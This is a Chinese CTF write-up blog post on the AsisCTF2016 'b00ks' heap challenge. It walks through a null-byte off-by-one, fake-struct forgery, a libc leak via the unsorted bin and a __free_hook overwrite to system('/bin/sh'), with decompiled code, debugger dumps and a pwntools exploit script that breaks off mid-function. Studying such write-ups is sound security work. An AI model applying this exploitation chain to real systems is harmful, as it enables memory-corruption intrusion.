<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>AsisCTF2016 b00ks 复现笔记 | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="AsisCTF2016 b00ks 复现笔记 | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/notes/asisctf2016-b00ks/"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"><div class="file"><a href="./README.mdx" class="file-link"><img src="/icons/text.png" alt/><span>README.mdx</span></a><div class="file-meta"><span>11.9 KiB</span><span class="file-meta-date">2024-01-23 00:25</span></div></div></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="offbyone" class="scroll-target"><a href="#offbyone"><code class="hash inline-code">#</code>记一道 offbyone 堆题的复现、反思与总结</a></h1>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>复现</a></h2>
<h3 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>题目介绍</a></h3>
<p><a href="https://buuoj.cn/challenges#asis2016_b00ks" title="https://buuoj.cn/challenges#asis2016_b00ks" target="_blank" rel="noopener">题目链接</a></p>
<p>菜单题，选单如下，其中 create 功能会创建一个 book，edit 功能只能修改 book 的 description，print 功能会打印 book 的 id/name/description/author, delete 功能会 free 掉 book name/book description/book self ：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-text">1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
</code></pre></div>
<p>题目每创建一个 book，会涉及到两个用于维护的数据结构：一个是 book struct 本身，一个是 book list。</p>
<p>book struct 结构如下，每个 book struct 耗用内存空间大小为 0x20：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#AB5959">struct</span><span style="color:#393A34"> book </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    int</span><span style="color:#393A34"> id</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    char</span><span style="color:#AB5959"> *</span><span style="color:#393A34">name</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    char</span><span style="color:#AB5959"> *</span><span style="color:#393A34">description</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    int</span><span style="color:#393A34"> size</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>book list 则是用来存放 book 的数组，主要用在 <code class="inline-code">delete a book</code> 和 <code class="inline-code">edit a book</code> 功能中。</p>
<p>注意到程序自己实现了一个输入函数 <code class="inline-code">input</code>：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">input</span><span style="color:#2993a3">(</span><span style="color:#AB5959">char</span><span style="color:#AB5959"> *</span><span style="color:#B07D48">target</span><span style="color:#999999">,</span><span style="color:#AB5959"> int</span><span style="color:#B07D48"> len</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    int</span><span style="color:#393A34"> i</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+14h] [rbp-Ch]</span><br><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> len </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">        return</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> i </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#999999"> ;</span><span style="color:#AB5959"> ++</span><span style="color:#393A34">i </span><span style="color:#1e754f">)</span><br><span style="color:#999999">    </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A"> read</span><span style="color:#a13865">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> target</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">uLL</span><span style="color:#a13865">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 1</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">            return</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959"> *</span><span style="color:#393A34">target </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">'</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">            break</span><span style="color:#999999">;</span><br><span style="color:#AB5959">        ++</span><span style="color:#393A34">target</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> i </span><span style="color:#AB5959">==</span><span style="color:#393A34"> len </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">            break</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#AB5959">    *</span><span style="color:#393A34">target </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>以及它的一个引用：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#393A34">__int64 </span><span style="color:#59873A">read_author</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter author name: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959"> !</span><span style="color:#59873A">input</span><span style="color:#a65e2b">(</span><span style="color:#393A34">author</span><span style="color:#999999">,</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959">LL</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">        return</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">fail to read author_name</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>注意一下：这个 <code class="inline-code">input</code> 函数的逻辑是，先读入一个字符，数组下标加一，检查已读入字符的长度，如果未达到 <code class="inline-code">len</code>，则继续读入；如果读入换行符，则退出循环并将换行符所在的位置置为 0。</p>
<p>因此，如果当 <code class="inline-code">input(author, 32LL)</code>，会触发一个 off by one 漏洞：假设输入 <code class="inline-code">&quot;a&quot; * 32 + '\n'</code> 时，<code class="inline-code">input</code>函数一定会将 <code class="inline-code">target[32]</code> （ target 0 ~ 31 是共计 32 个 'a'）置为 <code class="inline-code">\x00</code>。</p>
<p>这是 off by one in heap 的一个常见漏洞，即利用 Null byte 进行攻击。</p>
<p>这个题目附件的保护除了 canary 是开满的，我们需要利用 Null byte off by one 泄漏一些东西。</p>
<p>继续看，注意到 <code class="inline-code">create</code> 函数里会将创建好的 book struct 放在 book list 里：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#1E754F">if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34"> b </span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    b</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">size</span><span style="color:#999999"> =</span><span style="color:#393A34"> size</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                     // book name size</span><br><span style="color:#AB5959">    *</span><span style="color:#1e754f">(</span><span style="color:#393A34">pos </span><span style="color:#AB5959">+</span><span style="color:#393A34"> v2</span><span style="color:#1e754f">)</span><span style="color:#999999"> =</span><span style="color:#393A34"> b</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    b</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">description</span><span style="color:#999999"> =</span><span style="color:#393A34"> ptr2</span><span style="color:#999999">;</span><span style="color:#A0ADA0">              // book description</span><br><span style="color:#B07D48">    b</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">name</span><span style="color:#999999"> =</span><span style="color:#393A34"> ptr</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                      // book name</span><br><span style="color:#B07D48">    b</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">id</span><span style="color:#999999"> =</span><span style="color:#AB5959"> ++</span><span style="color:#393A34">id</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                       // book id</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>而 book list 的起始位置非常敏感，双击跟进去发现它的位置是 <code class="inline-code">unk_202060</code>，而 author 的位置是 <code class="inline-code">unk_202040</code>，而我们 read_author 函数正好可以读入一个 0x20 的字符串，而 book list 的起始位置（即 book1 的地址）和这个 author name 之间并没有空字符，通过功能 4 print the book detail 可以直接泄漏 book1，一个堆指针。</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-bash language-bash"><span style="color:#59873A">pwndbg</span><span style="color:#393A34">></span><span style="color:#393A34"> </span><span style="color:#B56959">x/16gx</span><span style="color:#B07D48"> $rebase</span><span style="color:#2993a3">(</span><span style="color:#59873A">0x202020+32</span><span style="color:#2993a3">)</span><br><span style="color:#59873A">0x5a7b29802040:</span><span style="color:#2F798A"> 0x6161616161616161</span><span style="color:#2F798A">                        0x6161616161616161</span><br><span style="color:#59873A">0x5a7b29802050:</span><span style="color:#2F798A"> 0x6161616161616161</span><span style="color:#2F798A">                        0x6261616161616161</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#B56959">===</span><span style="color:#B56959"> author</span><span style="color:#B56959"> name</span><br><span style="color:#59873A">0x5a7b29802060:</span><span style="color:#2F798A"> 0x00005a7b29f7b130</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#B56959">===</span><span style="color:#B56959"> the</span><span style="color:#B56959"> book1</span><span style="color:#B56959"> addr</span><span style="color:#2F798A">    0x0000000000000000</span><br><span style="color:#393A34">              </span><br></code></pre></div>
<p>另一个很重要的点是，<code class="inline-code">create</code> 时 book 的 <code class="inline-code">name_size</code> 和 <code class="inline-code">description_size</code> 都是完全可控的，并且，chunk 的申请顺序是先 <code class="inline-code">malloc name</code>，再 <code class="inline-code">malloc description</code>，最后 <code class="inline-code">malloc book struct</code>。</p>
<p>由于我们只能将 author 的后一位置为 <code class="inline-code">0</code>，也就是将 book1_addr 的低 byte 置为 <code class="inline-code">0</code>，而 edit book 功能又只能修改 description，只有通过构造恰当的 book name size，才能利用 description 指针构造 fake book1 做到任意地址读写。注意：book1 的 description 会被用来构造 fake book1，因此其大小必须为 0x20，因此只能调整 book name size。</p>
<p>调试发现，当 name size 为 0x80 时，<code class="inline-code">book1->description</code> 恰好为一个最低一字节全为 0 的地址，而这个地址所指向的内容是可以由 edit 功能任意修改的，故可以将其布置为一个 fake book1，其 name/descriton 全部由攻击者掌控。此时我们再调用一次 <code class="inline-code">read_author</code>， 即可覆盖 book1 最低字节为 0，而被覆盖后的地址恰好是原来 book 的 description，从而成功伪造一个完全可控的 fake book。</p>
<p>到这里，我们就成功拿到了任意地址读写，接下来只要泄漏 libc base，打一个 free hook 就可以了。</p>
<p>如何泄漏 libc base 呢？一个想法是申请一个非常大的 chunk，这个 chunk 由于过大，会撞到内存映射区，因此无法用 <code class="inline-code">(s)brk</code> 而只能用 <code class="inline-code">mmap</code> 申请。而 <code class="inline-code">mmap</code> 申请 arena 的内存与的 libc 的偏移是固定的，通过调试可以得出这个偏移值，只要读这个超级大 chunk 的地址，就可以拿到 libc base。</p>
<p>这个想法不太可行，很多师傅的 wp 都反映会出现本地通远程不通的情况，甚至我这里本地都不通（（</p>
<p>另一个想法是利用 unsort bin attack 泄漏 <code class="inline-code">fd</code> 指针，这个想法也比较简单，先 create 一个 name 和 description 都大于 80 bytes 的 book，然后 free 掉，这个 chunk 会被扔进 unsort bin 里，其 fd_addr 与 book1_addr 的偏移是固定的为 0x30，然后利用 <code class="inline-code">fd</code> 与 arena 存在固定偏移以及 arena 在 libc 全局符号表内，得出 libc base。</p>
<p>泄漏出 libc base 之后的 free hook 是没有难点的。</p>
<h3 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>攻击流程</a></h3>
<p>申请 3 个 book，book2 free 掉用来打 unsort bin attack，book1 伪造 fake book1，fake book1 的 name 布置为 book2->fd，其 description 指向 book3 的 description，前者 edit 为 <code class="inline-code">__free_hook</code>，后者 edit 为 <code class="inline-code">system</code>，然后 delete book3 即可执行 <code class="inline-code">system(&quot;/bin/sh&quot;)</code>。</p>
<h3 id="exp" class="scroll-target"><a href="#exp"><code class="hash inline-code">#</code>exp</a></h3>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-py language-py"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b00ks</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io = remote("node5.buuoj.cn", 29264)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">  </span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> option</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> create_book</span><span style="color:#2993a3">(</span><span style="color:#393A34">name_size</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#999999">,</span><span style="color:#393A34"> book_name</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#999999">,</span><span style="color:#393A34"> des_size</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#999999">,</span><span style="color:#393A34"> des</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    option</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">Enter book name size: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">name_size</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter book name (Max 32 chars): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">book_name</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">Enter book description size: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">des_size</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter book description: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> delete_book</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    option</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter the book id you want to delete: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> edit_book</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#999999">,</span><span style="color:#393A34"> des</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    option</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter the book id you want to edit: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter new book description: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">  </span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> print_book</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#2993a3">)</span><span style="color:#999999"> -</span><span style="color:#999999">></span><span style="color:#998418"> tuple</span><span style="color:#999999">:</span><br><span style="color:#393A34">    option</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">ID: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        idx</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#999999"> =</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Name: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        name</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#999999"> =</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Description: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        description</span><span style="color:#999999">:</span><span 